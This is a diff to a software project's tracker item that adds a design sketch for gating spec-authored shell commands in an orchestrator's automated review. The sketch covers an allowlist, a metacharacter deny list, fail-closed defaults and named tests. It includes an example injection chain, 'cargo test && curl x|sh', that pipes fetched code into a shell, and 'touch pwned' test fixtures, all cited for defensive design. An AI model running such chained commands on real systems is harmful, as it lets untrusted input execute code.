@@ -8,7 +8,7 @@ priority: High
 owner: ''
 feature: Uncategorized
 created_at: 2026-09-25T17:29:11.789280036Z
-modified_at: 2026-09-26T18:32:04.032360608Z
+modified_at: 2026-09-26T18:40:52.537832792Z
 req_type: Story
 comments:
 - id: 01a0d99d-4d51-7640-aa9b-fb5291e204a8
@@ -34,6 +34,77 @@ comments:
   content: 'PROXY DECISION (orchestrator for Joe): per Joe''s OPERATOR DECISION (2026-09-26) it stays Approved, but it is NOT queued yet. It is architecture-class: it changes the orchestrator''s graded-review phase (what the unattended drain executes) and adds a trusted-config key/allowlist (file format), and there is no SKETCH / ADVISOR SIGNOFF: APPROVED on the spec. Next step: post a sketch (config key and trusted layer, allowlist shape, how ''check by hand'' criteria surface in the verdict, migration note), get advisor signoff, then queue. Lane once signed off: drive (Joe merges), since it touches the review gate.'
   created_at: 2026-09-26T18:32:04.032360608Z
   modified_at: 2026-09-26T18:32:04.032360608Z
+  session_id: 71dca616-6150-461d-b64f-18c8288c6e1c
+- id: 01a0df05-2939-7133-b6b0-682a18d08739
+  author: joe
+  content: |-
+    SKETCH (awaiting advisor signoff):
+
+    OWNER / TRIGGER
+    - Owner: graded review, reviewer phase of the orchestrator. RealPhaseDriver::run_reviewer (aida-cli-lib/src/lib.rs ~106533) calls prepare_graded_review (lib.rs ~104843) whenever the spec description parses to >=1 CriterionKind::Executable. That calls graded_review::execute_graded_review (aida-cli-lib/src/graded_review.rs ~277), which today runs every one of those commands with `bash -c <command>` in a detached checkout of the PR head, with no permission check. Spec text comes from the shared store, so any node that can write a spec can run commands on the reviewer's machine during an unattended drain.
+    - Trigger for the new gate: the same call. The policy is resolved once in prepare_graded_review and passed into execute_graded_review, which asks it about each Executable criterion before spawning anything.
+
+    SURFACE
+    - Trust source is the machine-global config ONLY: ~/.aida/config.toml, resolved through crate::home_dir(). This follows the existing precedent in worktree_pool_global_hooks (lib.rs ~63338) and aida-core/src/worktree_hooks.rs ("code-exec config honored only from ~/.aida").
+        [review]
+        run_acceptance_commands = false          # default; true enables the gate below
+        acceptance_command_allow = ["cargo test", "cargo clippy", "make check-templates", "tests/"]   # word-prefix allowlist; ["*"] = run anything (explicit full trust)
+    - Deliberately NOT sources: repo .aida/config.toml (branch-local or the TASK-969 trusted_config::read_trusted_config_toml default-branch copy), the store/spec, env vars, and CLI flags. Why the default-branch copy is excluded too: in an unattended drain an agent PR that edits .aida/config.toml can reach main through the same graded review it would switch on, so the store and the repo could authorize themselves. If [review] run_acceptance_commands / acceptance_command_allow appears in a repo config it is ignored, and the verdict summary says so in one line ("repo-level opt-in ignored; set it in ~/.aida/config.toml").
+    - Matching: a command is permitted only if (a) run_acceptance_commands = true, (b) it contains none of these shell metacharacters: ; & | $ ` < > ( ) \ and newline (otherwise `cargo test && curl x|sh` would pass the prefix check), and (c) its whitespace-split words start with the words of some allow entry (whole words, not a raw string prefix: "cargo test" does not match "cargo testx"). "*" skips (b) and (c). A permitted command still runs via `bash -c` exactly as it does today, and the string that was checked is the string that runs (no re-parse).
+    - New types in graded_review.rs: `pub struct AcceptanceCommandPolicy { enabled: bool, allow: Vec<String>, repo_optin_ignored: bool }` with `fn permits(&self, cmd: &str) -> bool` and `Default` = denied. New `CriterionStatus::NotRun` (additive serde variant). New field on GradedReviewVerdict: `not_run_count: usize` (#[serde(default)]).
+    - Loader in lib.rs next to worktree_pool_global_hooks: `fn acceptance_command_policy_global() -> AcceptanceCommandPolicy` (does the I/O) plus pure `fn acceptance_command_policy_from_toml(&toml::Value) -> AcceptanceCommandPolicy`.
+    - Signature change: `execute_graded_review(..., evaluator, policy: &AcceptanceCommandPolicy)`.
+    - CLI: no setter verb. config_cmd.rs gets a KnobSpec for [review] run_acceptance_commands with EditSafety::ReadOnly { reason: "code-exec opt-in: edit ~/.aida/config.toml by hand" }. `aida config show` shows the value with source user-config or default. No env var can turn it on. (AIDA_REVIEW_RUN_ACCEPTANCE=0 as a force-off is optional; see Q4.)
+
+    DEFAULT (UNTRUSTED) BEHAVIOUR, FAIL-CLOSED
+    - A command that is not permitted is never spawned. Its result is CriterionStatus::NotRun, output "not run: spec-authored command not permitted by ~/.aida/config.toml [review]", no exit_code. It does not count toward machine_verified_count or machine_passed_count.
+    - Any NotRun forces escalated_to_seat = true and overall_verdict "escalated". Guard this explicitly: today, if every executable is skipped and there is no prose, min_probability stays 1.0 and the evaluator fast-pass branch would return "approved". NotRun criteria are never sent to the Jev/LLM evaluator either, because an LLM saying "cargo test passes" from reading a diff is not verification.
+    - generate_graded_reviewer_prompt lists NotRun items under "Needs manual verification (not executed automatically; inspect the command before running it)".
+    - Fail-closed cases, all resolving to Default (denied) and warning on stderr once per review: home dir missing, file absent, unreadable, TOML parse error (this also covers a half-written file read mid-edit), wrong types (e.g. run_acceptance_commands = "yes"), acceptance_command_allow missing or empty while enabled = true.
+
+    RACES
+    - The policy is snapshotted once per prepare_graded_review, before any spawn. Editing the config mid-review does not affect that review, and there is no check-then-reread (TOCTOU) gap.
+    - req.description is read from the store once (already true). The command string that was checked is the one executed.
+    - Concurrent reviewers on one machine each take their own read-only snapshot. Nothing writes shared state.
+    - Who can write the opt-in: only someone with write access to the operator's home directory. Spec authors on other nodes, PR branches, and merges to main cannot. A local agent with unrestricted shell could edit ~/.aida, but such an agent can already run arbitrary code, so the gate adds no new privilege. The threat this closes is cross-node and cross-branch execution. Worktree discipline already forbids agents writing ~/.aida; see Q3 for an optional hardening.
+
+    FILES (by symbol)
+    - aida-cli-lib/src/graded_review.rs: AcceptanceCommandPolicy (+permits), CriterionStatus::NotRun, GradedReviewVerdict.not_run_count, execute_graded_review (gate + forced escalation), generate_graded_reviewer_prompt (NotRun section).
+    - aida-cli-lib/src/lib.rs: acceptance_command_policy_global, acceptance_command_policy_from_toml, prepare_graded_review (resolve policy, detect ignored repo opt-in, pass it down).
+    - aida-cli-lib/src/config_cmd.rs: [review] run_acceptance_commands KnobSpec plus its policy row.
+    - aida-cli-lib/src/tests/story_1424_graded_review_tests.rs: existing calls pass an explicit permissive policy (AcceptanceCommandPolicy { enabled: true, allow: vec!["*"] }) so their meaning is unchanged.
+    - docs: CHANGELOG entry + migration note; graded-review/config reference doc (docs/cli config page).
+
+    NAMED TESTS (new file aida-cli-lib/src/tests/story_1476_acceptance_trust_tests.rs; fixtures only, temp dirs, fake HOME via test_home + EnvVarsGuard, never the real ~/.aida; the marker file lives in the temp checkout)
+    - story_1476_default_policy_does_not_run_spec_command: spec "`touch pwned`" with default policy leaves no marker file, status NotRun, verdict escalated. (This is the acceptance test the story asks for.)
+    - story_1476_all_notrun_with_evaluator_never_auto_approves: every criterion is NotRun, no prose, MockEvaluator returns p=1.0; verdict must not be "approved".
+    - story_1476_notrun_not_sent_to_evaluator: MockEvaluator records its calls; a NotRun command text never reaches it.
+    - story_1476_enabled_allowlisted_command_runs: fake HOME config enabled, allow ["touch"]; the marker is created and status is Passed.
+    - story_1476_metachar_chained_command_refused_under_prefix: allow ["cargo test"]; "cargo test && touch pwned" gives NotRun and no marker.
+    - story_1476_word_prefix_not_string_prefix: allow ["cargo test"] does not permit "cargo testx".
+    - story_1476_star_allows_metachars: allow ["*"] runs "true && touch ok".
+    - story_1476_repo_config_optin_ignored: repo .aida/config.toml (committed to main AND to origin/main) sets enabled + "*"; fake HOME has none; no marker, and the summary mentions the ignored repo opt-in.
+    - story_1476_malformed_global_config_fails_closed: truncated TOML in fake HOME gives the default policy.
+    - story_1476_enabled_but_empty_allow_denies: enabled=true, allow missing gives NotRun.
+    - story_1476_prompt_lists_notrun_as_manual: the reviewer prompt contains the manual-verification section with the command.
+    - story_1476_policy_from_toml_pure: table-driven parse cases for acceptance_command_policy_from_toml.
+
+    OUT OF SCOPE
+    - Sandboxing permitted commands (bubblewrap, systemd-run, network off). A permitted `cargo test` still runs PR-head code (build.rs, tests), the same as CI does today.
+    - Specs that approve themselves with trivial commands (`true`, `echo`) once trust is enabled (see Q2).
+    - Changing the parser heuristics (is_shell_command list), other code-exec config (pr-rebase smoke_check already goes through TASK-969), and the Phase 3 reviewer agent deciding on its own to run a NotRun command.
+
+    MIGRATION NOTES
+    - Behaviour change: installs that rely on auto-run (since STORY-1424) will see graded reviews escalate to the reviewer seat instead of auto-approving or auto-rejecting on executable checks. To restore it, add [review] run_acceptance_commands = true and an allowlist to ~/.aida/config.toml on each reviewer machine. Stored PR-*-graded.json records stay readable (new fields are additive with serde defaults).
+
+    OPEN QUESTIONS
+    Q1. Is a word-prefix allowlist plus the metacharacter refusal the right grain, or should v1 be a plain bool (all or nothing) with the allowlist as a follow-up? Recommendation: ship the allowlist now; the bool alone makes "*" the only practical setting.
+    Q2. Even when trusted, should an all-trivial executable set (only true/echo/test/cat) be barred from Rung-2 auto-approve? Recommendation: file a separate BUG; do not widen this story.
+    Q3. Harden against local agents: refuse to honour the opt-in when ~/.aida/config.toml was modified inside a running drain's window, or require a file mode or owner check? Recommendation: no for v1 (the threat model is cross-node).
+    Q4. Add AIDA_REVIEW_RUN_ACCEPTANCE=0 as an env force-off for CI or ephemeral nodes? Force-off only, never force-on.
+    Q5. Should a repo be able to NARROW the machine allowlist (its trusted default-branch copy may only remove entries, never add)? Recommendation: defer.
+  created_at: 2026-09-26T18:40:52.537832792Z
+  modified_at: 2026-09-26T18:40:52.537832792Z
   session_id: 71dca616-6150-461d-b64f-18c8288c6e1c
 history:
 - id: 01a0def4-fc93-7511-9f30-c80d96061f8f
